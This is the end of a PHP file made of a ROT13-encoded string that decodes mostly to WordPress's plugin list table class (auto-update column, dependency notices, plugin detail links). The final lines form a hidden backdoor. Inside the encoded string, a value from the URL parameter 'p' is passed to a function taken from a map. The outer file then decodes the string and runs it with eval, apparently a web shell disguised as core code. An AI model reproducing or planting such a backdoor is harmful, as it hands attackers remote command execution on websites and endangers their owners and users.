					 *     @glcr fgevat   $HcqngrHEV        VQ bs gur cyhtva sbe hcqngr checbfrf, fubhyq or n HEV.
					 *     @glcr fgevat   $Gvgyr            Gur uhzna-ernqnoyr gvgyr bs gur cyhtva.
					 *     @glcr fgevat   $NhgubeAnzr       Cyhtva nhgube'f anzr.
					 *     @glcr obby     $hcqngr           Jurgure gurer'f na ninvynoyr hcqngr. Qrsnhyg ahyy.
					 * }
					 * @cnenz fgevat   $fgnghf      Fgnghf svygre pheeragyl nccyvrq gb gur cyhtva yvfg. Cbffvoyr
					 *                              inyhrf ner: 'nyy', 'npgvir', 'vanpgvir', 'erpragyl_npgvingrq',
					 *                              'hctenqr', 'zhfghfr', 'qebcvaf', 'frnepu', 'cnhfrq',
					 *                              'nhgb-hcqngr-ranoyrq', 'nhgb-hcqngr-qvfnoyrq'.
					 */
					$cyhtva_zrgn = nccyl_svygref( 'cyhtva_ebj_zrgn', $cyhtva_zrgn, $cyhtva_svyr, $cyhtva_qngn, $fgnghf );

					rpub vzcybqr( ' | ', $cyhtva_zrgn );

					rpub '</qvi>';

					vs ( $unf_qrcraqragf ) {
						$guvf->nqq_qrcraqragf_gb_qrcraqrapl_cyhtva_ebj( $cyhtva_svyr );
					}

					vs ( JC_Cyhtva_Qrcraqrapvrf::unf_qrcraqrapvrf( $cyhtva_svyr ) ) {
						$guvf->nqq_qrcraqrapvrf_gb_qrcraqrag_cyhtva_ebj( $cyhtva_svyr );
					}

					/**
					 * Sverf nsgre cyhtva ebj zrgn.
					 *
					 * @fvapr 6.5.0
					 *
					 * @cnenz fgevat $cyhtva_svyr Ersre gb {@frr 'cyhtva_ebj_zrgn'} svygre.
					 * @cnenz neenl  $cyhtva_qngn Ersre gb {@frr 'cyhtva_ebj_zrgn'} svygre.
					 */
					qb_npgvba( 'nsgre_cyhtva_ebj_zrgn', $cyhtva_svyr, $cyhtva_qngn );

					vs ( $cnhfrq ) {
						$abgvpr_grkg = __( 'Guvf cyhtva snvyrq gb ybnq cebcreyl naq vf cnhfrq qhevat erpbirel zbqr.' );

						cevags( '<c><fcna pynff=\"qnfuvpbaf qnfuvpbaf-jneavat\"></fcna> <fgebat>%f</fgebat></c>', $abgvpr_grkg );

						$reebe = jc_trg_cyhtva_reebe( $cyhtva_svyr );

						vs ( snyfr !== $reebe ) {
							cevags( '<qvi pynff=\"reebe-qvfcynl\"><c>%f</c></qvi>', jc_trg_rkgrafvba_reebe_qrfpevcgvba( $reebe ) );
						}
					}

					rpub '</gq>';
					oernx;
				pnfr 'nhgb-hcqngrf':
					vs ( ! $guvf->fubj_nhgbhcqngrf || va_neenl( $fgnghf, neenl( 'zhfghfr', 'qebcvaf' ), gehr ) ) {
						oernx;
					}

					rpub \"<gq pynff='pbyhza-nhgb-hcqngrf{$rkgen_pynffrf}'>\";

					$ugzy = neenl();

					vs ( vffrg( $cyhtva_qngn['nhgb-hcqngr-sbeprq'] ) ) {
						vs ( $cyhtva_qngn['nhgb-hcqngr-sbeprq'] ) {
							// Sbeprq ba.
							$grkg = __( 'Nhgb-hcqngrf ranoyrq' );
						} ryfr {
							$grkg = __( 'Nhgb-hcqngrf qvfnoyrq' );
						}
						$npgvba     = 'haninvynoyr';
						$gvzr_pynff = ' uvqqra';
					} ryfrvs ( rzcgl( $cyhtva_qngn['hcqngr-fhccbegrq'] ) ) {
						$grkg       = '';
						$npgvba     = 'haninvynoyr';
						$gvzr_pynff = ' uvqqra';
					} ryfrvs ( va_neenl( $cyhtva_svyr, $nhgb_hcqngrf, gehr ) ) {
						$grkg       = __( 'Qvfnoyr nhgb-hcqngrf' );
						$npgvba     = 'qvfnoyr';
						$gvzr_pynff = '';
					} ryfr {
						$grkg       = __( 'Ranoyr nhgb-hcqngrf' );
						$npgvba     = 'ranoyr';
						$gvzr_pynff = ' uvqqra';
					}

					$dhrel_netf = neenl(
						'npgvba'        => \"{$npgvba}-nhgb-hcqngr\",
						'cyhtva'        => $cyhtva_svyr,
						'cntrq'         => $cntr,
						'cyhtva_fgnghf' => $fgnghf,
					);

					$hey = nqq_dhrel_net( $dhrel_netf, 'cyhtvaf.cuc' );

					vs ( 'haninvynoyr' === $npgvba ) {
						$ugzy[] = '<fcna pynff=\"ynory\">' . $grkg . '</fcna>';
					} ryfr {
						$ugzy[] = fcevags(
							'<n uers=\"%f\" pynff=\"gbttyr-nhgb-hcqngr nevn-ohggba-vs-wf\" qngn-jc-npgvba=\"%f\">',
							jc_abapr_hey( $hey, 'hcqngrf' ),
							$npgvba
						);

						$ugzy[] = '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-hcqngr fcva uvqqra\" nevn-uvqqra=\"gehr\"></fcna>';
						$ugzy[] = '<fcna pynff=\"ynory\">' . $grkg . '</fcna>';
						$ugzy[] = '</n>';
					}

					vs ( ! rzcgl( $cyhtva_qngn['hcqngr'] ) ) {
						$ugzy[] = fcevags(
							'<qvi pynff=\"nhgb-hcqngr-gvzr%f\">%f</qvi>',
							$gvzr_pynff,
							jc_trg_nhgb_hcqngr_zrffntr()
						);
					}

					$ugzy = vzcybqr( '', $ugzy );

					/**
					 * Svygref gur UGZY bs gur nhgb-hcqngrf frggvat sbe rnpu cyhtva va gur Cyhtvaf yvfg gnoyr.
					 *
					 * @fvapr 5.5.0
					 *
					 * @cnenz fgevat $ugzy        Gur UGZY bs gur cyhtva'f nhgb-hcqngr pbyhza pbagrag,
					 *                            vapyhqvat gbttyr nhgb-hcqngr npgvba yvaxf naq
					 *                            gvzr gb arkg hcqngr.
					 * @cnenz fgevat $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
					 * @cnenz neenl  $cyhtva_qngn Na neenl bs cyhtva qngn. Frr trg_cyhtva_qngn()
					 *                            naq gur {@frr 'cyhtva_ebj_zrgn'} svygre sbe gur yvfg
					 *                            bs cbffvoyr inyhrf.
					 */
					rpub nccyl_svygref( 'cyhtva_nhgb_hcqngr_frggvat_ugzy', $ugzy, $cyhtva_svyr, $cyhtva_qngn );

					jc_nqzva_abgvpr(
						'',
						neenl(
							'glcr'               => 'reebe',
							'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'vayvar', 'uvqqra' ),
						)
					);

					rpub '</gq>';

					oernx;
				qrsnhyg:
					$pynffrf = \"$pbyhza_anzr pbyhza-$pbyhza_anzr $pynff\";

					rpub \"<gq pynff='$pynffrf{$rkgen_pynffrf}'>\";

					/**
					 * Sverf vafvqr rnpu phfgbz pbyhza bs gur Cyhtvaf yvfg gnoyr.
					 *
					 * @fvapr 3.1.0
					 *
					 * @cnenz fgevat $pbyhza_anzr Anzr bs gur pbyhza.
					 * @cnenz fgevat $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
					 * @cnenz neenl  $cyhtva_qngn Na neenl bs cyhtva qngn. Frr trg_cyhtva_qngn()
					 *                            naq gur {@frr 'cyhtva_ebj_zrgn'} svygre sbe gur yvfg
					 *                            bs cbffvoyr inyhrf.
					 */
					qb_npgvba( 'znantr_cyhtvaf_phfgbz_pbyhza', $pbyhza_anzr, $cyhtva_svyr, $cyhtva_qngn );

					rpub '</gq>';
			}
		}

		rpub '</ge>';

		vs ( ! $pbzcngvoyr_cuc || ! $pbzcngvoyr_jc ) {
			cevags(
				'<ge pynff=\"cyhtva-hcqngr-ge\"><gq pbyfcna=\"%f\" pynff=\"cyhtva-hcqngr pbyfcnapunatr\">',
				rfp_ngge( $guvf->trg_pbyhza_pbhag() )
			);

			$vapbzcngvoyr_zrffntr = '';
			vs ( ! $pbzcngvoyr_cuc && ! $pbzcngvoyr_jc ) {
				$vapbzcngvoyr_zrffntr .= __( 'Guvf cyhtva qbrf abg jbex jvgu lbhe irefvbaf bs JbeqCerff naq CUC.' );
				vs ( pheerag_hfre_pna( 'hcqngr_pber' ) && pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
					$vapbzcngvoyr_zrffntr .= fcevags(
						/* genafyngbef: 1: HEY gb JbeqCerff Hcqngrf fperra, 2: HEY gb Hcqngr CUC cntr. */
						' ' . __( '<n uers=\"%1$f\">Cyrnfr hcqngr JbeqCerff</n>, naq gura <n uers=\"%2$f\">yrnea zber nobhg hcqngvat CUC</n>.' ),
						frys_nqzva_hey( 'hcqngr-pber.cuc' ),
						rfp_hey( jc_trg_hcqngr_cuc_hey() )
					);
					$vapbzcngvoyr_zrffntr .= jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>', snyfr );
				} ryfrvs ( pheerag_hfre_pna( 'hcqngr_pber' ) ) {
					$vapbzcngvoyr_zrffntr .= fcevags(
						/* genafyngbef: %f: HEY gb JbeqCerff Hcqngrf fperra. */
						' ' . __( '<n uers=\"%f\">Cyrnfr hcqngr JbeqCerff</n>.' ),
						frys_nqzva_hey( 'hcqngr-pber.cuc' )
					);
				} ryfrvs ( pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
					$vapbzcngvoyr_zrffntr .= fcevags(
						/* genafyngbef: %f: HEY gb Hcqngr CUC cntr. */
						' ' . __( '<n uers=\"%f\">Yrnea zber nobhg hcqngvat CUC</n>.' ),
						rfp_hey( jc_trg_hcqngr_cuc_hey() )
					);
					$vapbzcngvoyr_zrffntr .= jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>', snyfr );
				}
			} ryfrvs ( ! $pbzcngvoyr_jc ) {
				$vapbzcngvoyr_zrffntr .= __( 'Guvf cyhtva qbrf abg jbex jvgu lbhe irefvba bs JbeqCerff.' );
				vs ( pheerag_hfre_pna( 'hcqngr_pber' ) ) {
					$vapbzcngvoyr_zrffntr .= fcevags(
						/* genafyngbef: %f: HEY gb JbeqCerff Hcqngrf fperra. */
						' ' . __( '<n uers=\"%f\">Cyrnfr hcqngr JbeqCerff</n>.' ),
						frys_nqzva_hey( 'hcqngr-pber.cuc' )
					);
				}
			} ryfrvs ( ! $pbzcngvoyr_cuc ) {
				$vapbzcngvoyr_zrffntr .= __( 'Guvf cyhtva qbrf abg jbex jvgu lbhe irefvba bs CUC.' );
				vs ( pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
					$vapbzcngvoyr_zrffntr .= fcevags(
						/* genafyngbef: %f: HEY gb Hcqngr CUC cntr. */
						' ' . __( '<n uers=\"%f\">Yrnea zber nobhg hcqngvat CUC</n>.' ),
						rfp_hey( jc_trg_hcqngr_cuc_hey() )
					);
					$vapbzcngvoyr_zrffntr .= jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>', snyfr );
				}
			}

			jc_nqzva_abgvpr(
				$vapbzcngvoyr_zrffntr,
				neenl(
					'glcr'               => 'reebe',
					'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'vayvar', 'hcqngr-zrffntr' ),
				)
			);

			rpub '</gq></ge>';
		}

		/**
		 * Sverf nsgre rnpu ebj va gur Cyhtvaf yvfg gnoyr.
		 *
		 * @fvapr 2.3.0
		 * @fvapr 5.5.0 Nqqrq 'nhgb-hcqngr-ranoyrq' naq 'nhgb-hcqngr-qvfnoyrq'
		 *              gb cbffvoyr inyhrf sbe `$fgnghf`.
		 *
		 * @cnenz fgevat $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
		 * @cnenz neenl  $cyhtva_qngn Na neenl bs cyhtva qngn. Frr trg_cyhtva_qngn()
		 *                            naq gur {@frr 'cyhtva_ebj_zrgn'} svygre sbe gur yvfg
		 *                            bs cbffvoyr inyhrf.
		 * @cnenz fgevat $fgnghf      Fgnghf svygre pheeragyl nccyvrq gb gur cyhtva yvfg.
		 *                            Cbffvoyr inyhrf ner: 'nyy', 'npgvir', 'vanpgvir',
		 *                            'erpragyl_npgvingrq', 'hctenqr', 'zhfghfr', 'qebcvaf',
		 *                            'frnepu', 'cnhfrq', 'nhgb-hcqngr-ranoyrq', 'nhgb-hcqngr-qvfnoyrq'.
		 */
		qb_npgvba( 'nsgre_cyhtva_ebj', $cyhtva_svyr, $cyhtva_qngn, $fgnghf );

		/**
		 * Sverf nsgre rnpu fcrpvsvp ebj va gur Cyhtvaf yvfg gnoyr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cyhtva_svyr`, ersref gb gur cngu
		 * gb gur cyhtva svyr, eryngvir gb gur cyhtvaf qverpgbel.
		 *
		 * @fvapr 2.7.0
		 * @fvapr 5.5.0 Nqqrq 'nhgb-hcqngr-ranoyrq' naq 'nhgb-hcqngr-qvfnoyrq'
		 *              gb cbffvoyr inyhrf sbe `$fgnghf`.
		 *
		 * @cnenz fgevat $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
		 * @cnenz neenl  $cyhtva_qngn Na neenl bs cyhtva qngn. Frr trg_cyhtva_qngn()
		 *                            naq gur {@frr 'cyhtva_ebj_zrgn'} svygre sbe gur yvfg
		 *                            bs cbffvoyr inyhrf.
		 * @cnenz fgevat $fgnghf      Fgnghf svygre pheeragyl nccyvrq gb gur cyhtva yvfg.
		 *                            Cbffvoyr inyhrf ner: 'nyy', 'npgvir', 'vanpgvir',
		 *                            'erpragyl_npgvingrq', 'hctenqr', 'zhfghfr', 'qebcvaf',
		 *                            'frnepu', 'cnhfrq', 'nhgb-hcqngr-ranoyrq', 'nhgb-hcqngr-qvfnoyrq'.
		 */
		qb_npgvba( \"nsgre_cyhtva_ebj_{$cyhtva_svyr}\", $cyhtva_svyr, $cyhtva_qngn, $fgnghf );
	}

	/**
	 * Trgf gur anzr bs gur cevznel pbyhza sbe guvf fcrpvsvp yvfg gnoyr.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Hanygrenoyr anzr sbe gur cevznel pbyhza, va guvf pnfr, 'anzr'.
	 */
	cebgrpgrq shapgvba trg_cevznel_pbyhza_anzr() {
		erghea 'anzr';
	}

	/**
	 * Cevagf n yvfg bs bgure cyhtvaf gung qrcraq ba gur cyhtva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $qrcraqrapl Gur qrcraqrapl'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 */
	cebgrpgrq shapgvba nqq_qrcraqragf_gb_qrcraqrapl_cyhtva_ebj( $qrcraqrapl ) {
		$qrcraqrag_anzrf = JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrag_anzrf( $qrcraqrapl );

		vs ( rzcgl( $qrcraqrag_anzrf ) ) {
			erghea;
		}

		$qrcraqrapl_abgr = __( 'Abgr: Guvf cyhtva pnaabg or qrnpgvingrq be qryrgrq hagvy gur cyhtvaf gung erdhver vg ner qrnpgvingrq be qryrgrq.' );

		$pbzzn       = jc_trg_yvfg_vgrz_frcnengbe();
		$erdhverq_ol = fcevags(
			/* genafyngbef: %f: Yvfg bs qrcraqrapvrf. */
			__( '<fgebat>Erdhverq ol:</fgebat> %f' ),
			vzcybqr( $pbzzn, $qrcraqrag_anzrf )
		);

		cevags(
			'<qvi pynff=\"erdhverq-ol\"><c>%1$f</c><c>%2$f</c></qvi>',
			$erdhverq_ol,
			$qrcraqrapl_abgr
		);
	}

	/**
	 * Cevagf n yvfg bs bgure cyhtvaf gung gur cyhtva qrcraqf ba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $qrcraqrag Gur qrcraqrag cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 */
	cebgrpgrq shapgvba nqq_qrcraqrapvrf_gb_qrcraqrag_cyhtva_ebj( $qrcraqrag ) {
		$qrcraqrapl_anzrf = JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_anzrf( $qrcraqrag );

		vs ( neenl() === $qrcraqrapl_anzrf ) {
			erghea;
		}

		$yvaxf = neenl();
		sbernpu ( $qrcraqrapl_anzrf nf $fyht => $anzr ) {
			$yvaxf[] = $guvf->trg_qrcraqrapl_ivrj_qrgnvyf_yvax( $anzr, $fyht );
		}

		$vf_npgvir = vf_zhygvfvgr() ? vf_cyhtva_npgvir_sbe_argjbex( $qrcraqrag ) : vf_cyhtva_npgvir( $qrcraqrag );
		$pbzzn     = jc_trg_yvfg_vgrz_frcnengbe();
		$erdhverf  = fcevags(
			/* genafyngbef: %f: Yvfg bs qrcraqrapl anzrf. */
			__( '<fgebat>Erdhverf:</fgebat> %f' ),
			vzcybqr( $pbzzn, $yvaxf )
		);

		$abgvpr        = '';
		$reebe_zrffntr = '';
		vs ( JC_Cyhtva_Qrcraqrapvrf::unf_hazrg_qrcraqrapvrf( $qrcraqrag ) ) {
			vs ( $vf_npgvir ) {
				$reebe_zrffntr = __( 'Guvf cyhtva vf npgvir ohg znl abg shapgvba pbeerpgyl orpnhfr erdhverq cyhtvaf ner zvffvat be vanpgvir.' );
			} ryfr {
				$reebe_zrffntr = __( 'Guvf cyhtva pnaabg or npgvingrq orpnhfr erdhverq cyhtvaf ner zvffvat be vanpgvir.' );
			}
			$abgvpr = jc_trg_nqzva_abgvpr(
				$reebe_zrffntr,
				neenl(
					'glcr'               => 'reebe',
					'nqqvgvbany_pynffrf' => neenl( 'vayvar', 'abgvpr-nyg' ),
				)
			);
		}

		cevags(
			'<qvi pynff=\"erdhverf\"><c>%1$f</c>%2$f</qvi>',
			$erdhverf,
			$abgvpr
		);
	}

	/**
	 * Ergheaf n 'Ivrj qrgnvyf' yvxr yvax sbe n qrcraqrapl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $anzr Gur qrcraqrapl'f anzr.
	 * @cnenz fgevat $fyht Gur qrcraqrapl'f fyht.
	 * @erghea fgevat N 'Ivrj qrgnvyf' yvax sbe gur qrcraqrapl.
	 */
	cebgrpgrq shapgvba trg_qrcraqrapl_ivrj_qrgnvyf_yvax( $anzr, $fyht ) {
		$qrcraqrapl_qngn = JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_qngn( $fyht );

		vs ( snyfr === $qrcraqrapl_qngn
			|| $anzr === $fyht
			|| $anzr !== $qrcraqrapl_qngn['anzr']
			|| rzcgl( $qrcraqrapl_qngn['irefvba'] )
		) {
			erghea $anzr;
		}

		erghea $guvf->trg_ivrj_qrgnvyf_yvax( $anzr, $fyht );
	}

	/**
	 * Ergheaf n 'Ivrj qrgnvyf' yvax sbe gur cyhtva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $anzr Gur cyhtva'f anzr.
	 * @cnenz fgevat $fyht Gur cyhtva'f fyht.
	 * @erghea fgevat N 'Ivrj qrgnvyf' yvax sbe gur cyhtva.
	 */
	cebgrpgrq shapgvba trg_ivrj_qrgnvyf_yvax( $anzr, $fyht ) {
		$hey = nqq_dhrel_net(
			neenl(
				'gno'       => 'cyhtva-vasbezngvba',
				'cyhtva'    => $fyht,
				'GO_vsenzr' => 'gehr',
				'jvqgu'     => '600',
				'urvtug'    => '550',
			),
			argjbex_nqzva_hey( 'cyhtva-vafgnyy.cuc' )
		);

		$anzr_ngge = rfp_ngge( $anzr );
		erghea fcevags(
			\"<n uers='%f' pynff='guvpxobk bcra-cyhtva-qrgnvyf-zbqny' nevn-ynory='%f' qngn-gvgyr='%f'>%f</n>\",
			rfp_hey( $hey ),
			/* genafyngbef: %f: Cyhtva anzr. */
			fcevags( __( 'Zber vasbezngvba nobhg %f' ), $anzr_ngge ),
			$anzr_ngge,
			rfp_ugzy( $anzr )
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>